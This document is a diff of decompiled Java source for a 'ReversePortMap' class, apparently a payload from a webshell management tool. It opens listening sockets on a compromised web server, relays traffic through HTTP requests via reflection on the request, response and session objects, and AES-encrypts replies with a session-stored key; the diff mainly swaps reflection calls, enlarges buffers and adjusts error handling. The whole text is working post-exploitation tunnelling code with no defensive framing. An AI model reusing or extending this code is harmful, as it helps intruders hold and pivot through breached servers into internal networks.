@@ -27,52 +27,81 @@ public class ReversePortMap implements Runnable {
 
    public boolean equals(Object obj) {
       HashMap result = new HashMap();
-      boolean var24 = false;
+      boolean var27 = false;
 
-      Object so;
       Method write;
-      label272: {
+      Object so;
+      label435: {
          try {
-            var24 = true;
+            var27 = true;
             this.fillContext(obj);
             Map paramMap = new HashMap();
             paramMap.put("request", this.Request);
             paramMap.put("response", this.Response);
             paramMap.put("session", this.Session);
             if (action.equals("create")) {
-               try {
-                  String serverSocketHash = "reverseportmap_server_" + listenPort;
-                  paramMap.put("serverSocketHash", serverSocketHash);
-                  paramMap.put("listenPort", listenPort);
-                  ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
-                  serverSocketChannel.bind(new InetSocketAddress(Integer.parseInt(listenPort)));
-                  this.sessionSetAttribute(this.Session, serverSocketHash, serverSocketChannel);
-                  serverSocketChannel.socket().setReuseAddress(true);
-                  (new Thread(new ReversePortMap("daemon", paramMap))).start();
-                  result.put("status", "success");
-                  result.put("msg", "success");
-                  var24 = false;
-               } catch (Exception var31) {
-                  result.put("status", "fail");
-                  result.put("msg", var31.getMessage());
-                  var24 = false;
-               }
-            } else if (action.equals("list")) {
-               List socketList = new ArrayList();
-               Enumeration keys = this.sessionGetAttributeNames(this.Session);
-
-               while(keys.hasMoreElements()) {
-                  String socketHash = keys.nextElement().toString();
-                  if (socketHash.indexOf("reverseportmap") >= 0) {
-                     Map socketObj = new HashMap();
-                     socketObj.put("socketHash", socketHash);
-                     socketList.add(socketObj);
-                  }
-               }
-
+               String serverSocketHash = "reverseportmap_server_" + listenPort;
+               paramMap.put("serverSocketHash", serverSocketHash);
+               paramMap.put("listenPort", listenPort);
+               ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
+               serverSocketChannel.bind(new InetSocketAddress(Integer.parseInt(listenPort)));
+               this.sessionSetAttribute(this.Session, serverSocketHash, serverSocketChannel);
+               serverSocketChannel.socket().setReuseAddress(true);
+               (new Thread(new ReversePortMap("daemon", paramMap))).start();
                result.put("status", "success");
-               result.put("msg", this.buildJsonArray(socketList, false));
-               var24 = false;
+               result.put("msg", "success");
+               var27 = false;
+            } else if (action.equals("list")) {
+               boolean var41 = false;
+
+               label379: {
+                  try {
+                     var41 = true;
+                     List socketList = new ArrayList();
+                     Enumeration keys = this.sessionGetAttributeNames(this.Session);
+
+                     while(keys.hasMoreElements()) {
+                        String socketHash = keys.nextElement().toString();
+                        if (socketHash.indexOf("reverseportmap") >= 0) {
+                           Map socketObj = new HashMap();
+                           socketObj.put("socketHash", socketHash);
+                           socketList.add(socketObj);
+                        }
+                     }
+
+                     result.put("status", "success");
+                     result.put("msg", this.buildJsonArray(socketList, false));
+                     var41 = false;
+                     break label379;
+                  } catch (Exception var48) {
+                     result.put("status", "fail");
+                     result.put("msg", var48.getMessage());
+                     var41 = false;
+                  } finally {
+                     if (var41) {
+                        so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                        Method var10 = so.getClass().getMethod("write", byte[].class);
+                        var10.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                        so.getClass().getMethod("flush").invoke(so);
+                        so.getClass().getMethod("close").invoke(so);
+                     }
+                  }
+
+                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getMethod("write", byte[].class);
+                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  so.getClass().getMethod("flush").invoke(so);
+                  so.getClass().getMethod("close").invoke(so);
+                  var27 = false;
+                  break label435;
+               }
+
+               so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+               write = so.getClass().getMethod("write", byte[].class);
+               write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+               so.getClass().getMethod("flush").invoke(so);
+               so.getClass().getMethod("close").invoke(so);
+               var27 = false;
             } else {
                SocketChannel serverInnersocket;
                if (action.equals("read")) {
@@ -80,7 +109,7 @@ public class ReversePortMap implements Runnable {
                   serverInnersocket.configureBlocking(false);
 
                   try {
-                     ByteBuffer buf = ByteBuffer.allocate(1024);
+                     ByteBuffer buf = ByteBuffer.allocate(20480);
                      int bytesRead = serverInnersocket.read(buf);
                      so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
 
@@ -89,20 +118,20 @@ public class ReversePortMap implements Runnable {
                         buf.clear();
                      }
 
-                     so.getClass().getDeclaredMethod("flush").invoke(so);
-                     so.getClass().getDeclaredMethod("close").invoke(so);
-                     var24 = false;
-                  } catch (Exception var32) {
-                     this.Response.getClass().getDeclaredMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
-                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     so.getClass().getMethod("flush").invoke(so);
+                     so.getClass().getMethod("close").invoke(so);
+                     var27 = false;
+                  } catch (Exception var50) {
+                     this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
+                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getMethod("write", byte[].class);
                      write.invoke(so, new byte[]{55, 33, 73, 54});
-                     write.invoke(so, var32.getMessage().getBytes());
-                     so.getClass().getDeclaredMethod("flush").invoke(so);
-                     so.getClass().getDeclaredMethod("close").invoke(so);
-                     var24 = false;
-                  } catch (Error var33) {
-                     var24 = false;
+                     so.getClass().getMethod("flush").invoke(so);
+                     so.getClass().getMethod("close").invoke(so);
+                     var27 = false;
+                  } catch (Error var51) {
+                     var51.printStackTrace();
+                     var27 = false;
                   }
                } else if (action.equals("write")) {
                   serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, ReversePortMap.socketHash);
@@ -118,16 +147,16 @@ public class ReversePortMap implements Runnable {
                         serverInnersocket.write(buf);
                      }
 
-                     var24 = false;
-                  } catch (Exception var34) {
-                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     var27 = false;
+                  } catch (Exception var52) {
+                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getMethod("write", byte[].class);
                      write.invoke(so, new byte[]{55, 33, 73, 54});
-                     write.invoke(so, var34.getMessage().getBytes());
-                     so.getClass().getDeclaredMethod("flush").invoke(so);
-                     so.getClass().getDeclaredMethod("close").invoke(so);
+                     write.invoke(so, var52.getMessage().getBytes());
+                     so.getClass().getMethod("flush").invoke(so);
+                     so.getClass().getMethod("close").invoke(so);
                      serverInnersocket.close();
-                     var24 = false;
+                     var27 = false;
                   }
                } else if (!action.equals("stop")) {
                   if (action.equals("close")) {
@@ -135,14 +164,14 @@ public class ReversePortMap implements Runnable {
                         serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, ReversePortMap.socketHash);
                         serverInnersocket.close();
                         this.sessionRemoveAttribute(this.Session, ReversePortMap.socketHash);
-                     } catch (Exception var28) {
+                     } catch (Exception var45) {
                      }
 
                      result.put("status", "success");
                      result.put("msg", "服务侧Socket资源已释放。");
-                     var24 = false;
+                     var27 = false;
                   } else {
-                     var24 = false;
+                     var27 = false;
                   }
                } else {
                   Enumeration keys = this.sessionGetAttributeNames(this.Session);
@@ -155,7 +184,7 @@ public class ReversePortMap implements Runnable {
                            serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, socketHash);
                            this.sessionRemoveAttribute(this.Session, socketHash);
                            serverInnersocket.close();
-                        } catch (Exception var30) {
+                        } catch (Exception var47) {
                         }
                      }
                   }
@@ -165,52 +194,64 @@ public class ReversePortMap implements Runnable {
                      ServerSocketChannel serverSocket = (ServerSocketChannel)this.sessionGetAttribute(this.Session, socketHash);
                      this.sessionRemoveAttribute(this.Session, socketHash);
                      serverSocket.close();
-                  } catch (Exception var29) {
+                  } catch (Exception var46) {
+                     var46.printStackTrace();
                   }
 
                   result.put("status", "success");
                   result.put("msg", "服务侧Socket资源已释放。");
-                  var24 = false;
+                  var27 = false;
                }
             }
-            break label272;
-         } catch (Exception var35) {
+            break label435;
+         } catch (Exception var53) {
+            var53.printStackTrace();
             result.put("status", "fail");
-            result.put("msg", action + ":" + var35.getMessage());
-            var24 = false;
+            result.put("msg", action + ":" + var53.getMessage());
+            var27 = false;
          } finally {
-            if (var24) {
+            if (var27) {
                try {
-                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-                  write = so.getClass().getDeclaredMethod("write", byte[].class);
-                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  so.getClass().getDeclaredMethod("flush").invoke(so);
-                  so.getClass().getDeclaredMethod("close").invoke(so);
-               } catch (Exception var25) {
+                  if (!action.equals("read")) {
+                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getMethod("write", byte[].class);
+                     write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                     so.getClass().getMethod("flush").invoke(so);
+                     so.getClass().getMethod("close").invoke(so);
+                  }
+               } catch (Exception var42) {
+                  var42.printStackTrace();
                }
 
             }
          }
 
          try {
-            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-            write = so.getClass().getDeclaredMethod("write", byte[].class);
-            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.getClass().getDeclaredMethod("flush").invoke(so);
-            so.getClass().getDeclaredMethod("close").invoke(so);
-         } catch (Exception var26) {
+            if (!action.equals("read")) {
+               so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+               write = so.getClass().getMethod("write", byte[].class);
+               write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+               so.getClass().getMethod("flush").invoke(so);
+               so.getClass().getMethod("close").invoke(so);
+               return true;
+            }
+         } catch (Exception var43) {
+            var43.printStackTrace();
          }
 
          return true;
       }
 
       try {
-         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-         write = so.getClass().getDeclaredMethod("write", byte[].class);
-         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.getClass().getDeclaredMethod("flush").invoke(so);
-         so.getClass().getDeclaredMethod("close").invoke(so);
-      } catch (Exception var27) {
+         if (!action.equals("read")) {
+            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getMethod("flush").invoke(so);
+            so.getClass().getMethod("close").invoke(so);
+         }
+      } catch (Exception var44) {
+         var44.printStackTrace();
       }
 
       return true;
@@ -252,9 +293,9 @@ public class ReversePortMap implements Runnable {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
          this.Session = objMap.get("session");
@@ -262,7 +303,7 @@ public class ReversePortMap implements Runnable {
          this.Request = objMap.get("request");
       }
 
-      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 
    private String buildJson(Map entity, boolean encode) throws Exception {
@@ -343,7 +384,7 @@ public class ReversePortMap implements Runnable {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -356,7 +397,7 @@ public class ReversePortMap implements Runnable {
       Object result = null;
 
       try {
-         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
       } catch (Exception var5) {
       }
 
@@ -365,7 +406,7 @@ public class ReversePortMap implements Runnable {
 
    private void sessionSetAttribute(Object session, String key, Object value) {
       try {
-         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
       } catch (Exception var5) {
       }
 
@@ -375,7 +416,7 @@ public class ReversePortMap implements Runnable {
       Enumeration result = null;
 
       try {
-         result = (Enumeration)session.getClass().getDeclaredMethod("getAttributeNames").invoke(session);
+         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
       } catch (Exception var4) {
       }
 
@@ -384,7 +425,7 @@ public class ReversePortMap implements Runnable {
 
    private void sessionRemoveAttribute(Object session, String key) {
       try {
-         session.getClass().getDeclaredMethod("removeAttribute").invoke(session, key);
+         session.getClass().getMethod("removeAttribute").invoke(session, key);
       } catch (Exception var4) {
       }
 
